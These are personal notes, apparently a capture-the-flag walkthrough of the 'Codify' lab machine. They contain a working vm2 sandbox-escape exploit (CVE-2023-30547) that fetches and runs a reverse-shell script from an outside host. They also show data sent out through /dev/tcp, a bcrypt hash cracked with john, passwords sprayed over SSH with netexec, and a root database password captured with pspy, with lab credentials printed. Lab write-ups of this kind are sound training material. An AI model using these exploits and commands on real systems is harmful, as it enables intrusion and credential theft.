@@ -1,0 +1,305 @@
+
+
+website is for testing Node.js code using a vm2 sandbox.
+
+
+CVE-2023-30547
+"vm2 is a sandbox that can run untrusted code with whitelisted Node's built-in modules. There exists a vulnerability in exception sanitization of vm2 for versions up to 3.9.16, allowing attackers to raise an unsanitized host exception inside `handleException()` which can be used to escape the sandbox and run arbitrary code in host context. This vulnerability was patched in the release of version `3.9.17` of `vm2`. There are no known workarounds for this vulnerability. Users are advised to upgrade."
+We modify this PoC
+https://gist.github.com/leesh3288/381b230b04936dd4d74aaf90cc8bb244
+
+const { VM } = require("vm2");
+const vm = new VM();
+
+const code = `
+err = {};
+const handler = {
+    getPrototypeOf(target) {
+        (function stack() {
+            new Error().stack;
+            stack();
+        })();
+    }
+};
+const proxiedErr = new Proxy(err, handler);
+
+try {
+    throw proxiedErr;
+} catch ({ constructor: c }) {
+    // We see that the script is successfully executed, our bash script is downloaded,
+    // and we get a connection back to our Netcat listener as the user svc.
+    // To get a more stable shell, we can run the script command to create a new PTY.
+    c.constructor('return process')()
+        .mainModule.require('child_process')
+        .execSync('curl http://10.10.14.16:8000/rev.sh|bash');
+}
+`;
+
+console.log(vm.run(code));
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# python3 -m http.server                                                     
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+10.10.11.239 - - [26/Aug/2025 23:45:39] "GET /rev.sh HTTP/1.1" 200 -
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# nc -lvnp 4444
+listening on [any] 4444 ...
+connect to [10.10.14.16] from (UNKNOWN) [10.10.11.239] 38444
+sh: 0: can't access tty; job control turned off
+$ 
+
+
+svc@codify:/var/www/contact$ cat tickets.db
+�T5��T�format 3@  .WJ
+       otableticketsticketsCREATE TABLE tickets (id INTEGER PRIMARY KEY AUTOINCREMENT, name TEXT, topic TEXT, description TEXT, status TEXT)P++Ytablesqlite_sequencesqlite_sequenceCREATE TABLE sqlite_sequence(name,seq)��	tableusersusersCREATE TABLE users (
+        id INTEGER PRIMARY KEY AUTOINCREMENT, 
+        username TEXT UNIQUE, 
+        password TEXT
+��G�joshua$2a$12$SOn8Pf6z8fO/nVsNbAAequ/P6vLRJJl7gCUEiYBU2iLHn4G/p/Zw2
+��
+����ua  users
+             ickets
+r]r�h%%�Joe WilliamsLocal setup?I use this site lot of the time. Is it possible to set this up locally? Like instead of coming to this site, can I download this and set it up in my own computer? A feature like that would be nice.open� ;�wTom HanksNeed networking modulesI think it would be better if you can implement a way to handle network-based stuff. Would help me out a lot. Thanks!opensvc@codify:/var/www/contact$ 
+
+
+the $2a$ means bcrypt hash, mode 3200
+
+if we needed to send the file to our machine, we could instead use
+nc -lvnp 2222 > tickets.db
+and
+cat tickets.db > /dev/tcp/10.1014.16/2222
+then
+sqlite3 tickets.db
+.tables
+select * from users;
+
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# echo '$2a$12$SOn8Pf6z8fO/nVsNbAAequ/P6vLRJJl7gCUEiYBU2iLHn4G/p/Zw2' > hash
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+└─# john --wordlist=/usr/share/wordlists/rockyou.txt hash
+Using default input encoding: UTF-8
+Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
+Cost 1 (iteration count) is 4096 for all loaded hashes
+Will run 3 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+spongebob1       (?)     
+1g 0:00:00:51 DONE (2025-08-26 23:55) 0.01930g/s 26.06p/s 26.06c/s 26.06C/s kissmyass..eunice
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed. 
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+└─# 
+
+we saw that joshua was the only other one with a home directory.
+but just in case
+
+svc@codify:~$ cat /etc/passwd
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
+systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
+systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
+messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
+systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
+pollinate:x:105:1::/var/cache/pollinate:/bin/false
+sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
+syslog:x:107:113::/home/syslog:/usr/sbin/nologin
+uuidd:x:108:114::/run/uuidd:/usr/sbin/nologin
+tcpdump:x:109:115::/nonexistent:/usr/sbin/nologin
+tss:x:110:116:TPM software stack,,,:/var/lib/tpm:/bin/false
+landscape:x:111:117::/var/lib/landscape:/usr/sbin/nologin
+usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
+lxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false
+dnsmasq:x:113:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
+joshua:x:1000:1000:,,,:/home/joshua:/bin/bash
+svc:x:1001:1001:,,,:/home/svc:/bin/bash
+fwupd-refresh:x:114:122:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
+_laurel:x:998:998::/var/log/laurel:/bin/false
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# netexec ssh 10.10.11.239 -u users.txt -p 'spongebob1'
+SSH         10.10.11.239    22     10.10.11.239     [*] SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.4
+SSH         10.10.11.239    22     10.10.11.239     [-] root:spongebob1
+SSH         10.10.11.239    22     10.10.11.239     [-] daemon:spongebob1
+SSH         10.10.11.239    22     10.10.11.239     [-] bin:spongebob1
+...
+SSH         10.10.11.239    22     10.10.11.239     [+] joshua:spongebob1  Linux - Shell access!
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+└─# ssh joshua@10.10.11.239    
+The authenticity of host '10.10.11.239 (10.10.11.239)' can't be established.
+ED25519 key fingerprint is SHA256:Q8HdGZ3q/X62r8EukPF0ARSaCd+8gEhEJ10xotOsBBE.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.10.11.239' (ED25519) to the list of known hosts.
+joshua@10.10.11.239's password: 
+Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-88-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Wed Aug 27 04:09:47 AM UTC 2025
+
+  System load:                      0.0810546875
+  Usage of /:                       64.1% of 6.50GB
+  Memory usage:                     24%
+  Swap usage:                       0%
+  Processes:                        290
+  Users logged in:                  0
+  IPv4 address for br-030a38808dbf: 172.18.0.1
+  IPv4 address for br-5ab86a4e40d0: 172.19.0.1
+  IPv4 address for docker0:         172.17.0.1
+  IPv4 address for eth0:            10.10.11.239
+  IPv6 address for eth0:            dead:beef::250:56ff:feb0:e1e0
+
+
+Expanded Security Maintenance for Applications is not enabled.
+
+0 updates can be applied immediately.
+
+Enable ESM Apps to receive additional future security updates.
+See https://ubuntu.com/esm or run: sudo pro status
+
+
+The list of available updates is more than a week old.
+To check for new updates run: sudo apt update
+Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
+
+
+Last login: Wed Mar 27 13:01:24 2024 from 10.10.14.23
+joshua@codify:~$ ls -la
+total 32
+drwxrwx--- 3 joshua joshua 4096 Nov  2  2023 .
+drwxr-xr-x 4 joshua joshua 4096 Sep 12  2023 ..
+lrwxrwxrwx 1 root   root      9 May 30  2023 .bash_history -> /dev/null
+-rw-r--r-- 1 joshua joshua  220 Apr 21  2023 .bash_logout
+-rw-r--r-- 1 joshua joshua 3771 Apr 21  2023 .bashrc
+drwx------ 2 joshua joshua 4096 Sep 14  2023 .cache
+-rw-r--r-- 1 joshua joshua  807 Apr 21  2023 .profile
+-rw-r----- 1 root   joshua   33 Aug 26 05:16 user.txt
+-rw-r--r-- 1 joshua joshua   39 Sep 14  2023 .vimrc
+ 
+
+
+joshua@codify:~$ sudo -l
+[sudo] password for joshua: 
+Matching Defaults entries for joshua on codify:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
+
+User joshua may run the following commands on codify:
+    (root) /opt/scripts/mysql-backup.sh
+joshua@codify:~$ 
+joshua@codify:~$ cat /opt/scripts/mysql-backup.sh
+#!/bin/bash
+DB_USER="root"
+DB_PASS=$(/usr/bin/cat /root/.creds)
+BACKUP_DIR="/var/backups/mysql"
+
+read -s -p "Enter MySQL password for $DB_USER: " USER_PASS
+/usr/bin/echo
+
+if [[ $DB_PASS == $USER_PASS ]]; then
+        /usr/bin/echo "Password confirmed!"
+else
+        /usr/bin/echo "Password confirmation failed!"
+        exit 1
+fi
+
+/usr/bin/mkdir -p "$BACKUP_DIR"
+
+databases=$(/usr/bin/mysql -u "$DB_USER" -h 0.0.0.0 -P 3306 -p"$DB_PASS" -e "SHOW DATABASES;" | /usr/bin/grep -Ev "(Database|information_schema|performance_schema)")
+
+for db in $databases; do
+    /usr/bin/echo "Backing up database: $db"
+    /usr/bin/mysqldump --force -u "$DB_USER" -h 0.0.0.0 -P 3306 -p"$DB_PASS" "$db" | /usr/bin/gzip > "$BACKUP_DIR/$db.sql.gz"
+done
+
+/usr/bin/echo "All databases backed up successfully!"
+/usr/bin/echo "Changing the permissions"
+/usr/bin/chown root:sys-adm "$BACKUP_DIR"
+/usr/bin/chmod 774 -R "$BACKUP_DIR"
+/usr/bin/echo 'Done!'
+joshua@codify:~$ 
+
+
+" Sets up variables for the database user ( DB_USER ), retrieves the database password from a file
+( DB_PASS ), and specifies the backup directory ( BACKUP_DIR ).
+sudo -l
+2. Prompts the user to enter the MySQL password for the specified database user and compares the
+entered password ( USER_PASS ) with the one retrieved from the file ( DB_PASS ) and exits if they do not
+match.
+3. Creates the backup directory if it doesn't exist. Retrieves a list of databases from the MySQL server,
+excluding system databases (information_schema, performance_schema), using the provided user
+credentials. Iterates through the list of databases and dumps them using mysqldump , afterwards
+compressing the output and saving it as a gzip file in the backup directory.
+4. Changes the permissions of the backup directory to be owned by root:sys-adm and sets the
+permissions to 774 recursively. Prints a message indicating that the backup process is complete"
+
+
+so we
+joshua@codify:~$ wget http://10.10.14.16:8000/pspy64s
+--2025-08-27 05:12:13--  http://10.10.14.16:8000/pspy64s
+Connecting to 10.10.14.16:8000... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 1392200 (1.3M) [application/octet-stream]
+Saving to: ‘pspy64s’
+
+pspy64s                       100%[==============================================>]   1.33M  6.06MB/s    in 0.2s    
+
+2025-08-27 05:12:13 (6.06 MB/s) - ‘pspy64s’ saved [1392200/1392200]
+
+joshua@codify:~$ chmod +x pspy64s
+joshua@codify:~$ ./pspy64s
+
+enter * for the following password
+joshua@codify:~$ sudo /opt/scripts/mysql-backup.sh
+Enter MySQL password for root: 
+Password confirmed!
+mysql: [Warning] Using a password on the command line interface can be insecure.
+Backing up database: mysql
+mysqldump: [Warning] Using a password on the command line interface can be insecure.
+-- Warning: column statistics not supported by the server.
+mysqldump: Got error: 1556: You can't use locks with log tables when using LOCK TABLES
+mysqldump: Got error: 1556: You can't use locks with log tables when using LOCK TABLES
+Backing up database: sys
+mysqldump: [Warning] Using a password on the command line interface can be insecure.
+-- Warning: column statistics not supported by the server.
+All databases backed up successfully!
+Changing the permissions
+Done!
+joshua@codify:~$ 
+
+
+pspy leaks the password to us
+
+2025/08/27 05:14:34 CMD: UID=0     PID=3584   | /usr/bin/mysqldump --force -u root -h 0.0.0.0 -P 3306 -pkljh12k3jhaskjh12kjh3 sys 
+
+we su root using the password kljh12k3jhaskjh12kjh3
+
+
+
